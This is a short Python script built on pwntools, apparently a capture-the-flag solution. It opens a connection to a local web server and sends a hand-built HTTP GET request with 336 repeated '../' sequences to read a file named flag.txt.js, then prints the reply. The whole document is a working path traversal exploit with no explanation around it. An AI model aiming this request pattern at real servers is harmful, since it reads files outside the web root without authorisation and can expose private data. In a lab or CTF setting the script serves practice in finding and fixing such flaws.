from pwn import *
conn = remote('localhost', 8081)

conn.send(f"GET /{'../'*336}flag.txt.js HTTP/1.1\r\nHost: localhost:8000\r\n".encode())
print(conn.recv())
conn.interactive()